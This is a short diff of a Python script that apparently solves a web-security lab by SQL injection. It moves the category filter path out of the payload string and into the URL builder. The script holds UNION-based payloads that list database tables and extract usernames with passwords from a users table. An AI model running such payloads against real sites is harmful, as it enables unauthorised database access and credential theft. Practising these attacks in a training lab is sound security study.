@@ -10,7 +10,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 r = requests.Session()
 admin_username = 'administrator'
 password = ''
-poc_payload_for_users_table = "filter?category='union+SELECT+null,TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+like+'%25users%25'--"
+poc_payload_for_users_table = "'union+SELECT+null,TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_NAME+like+'%25users%25'--"
 payload_to_get_users_with_passwords = "='union+SELECT+null,CONCAT(username,'%23',password)+FROM+users--"
 
 url = input('Enter lab url: ')
@@ -22,7 +22,7 @@ proxies = {
 
 def filter_url():
     global url
-    url = (url.split('.net', 1)[0]) + f'.net/{poc_payload_for_users_table}'
+    url = (url.split('.net', 1)[0]) + f'.net/filter?category={poc_payload_for_users_table}'
         
 
 
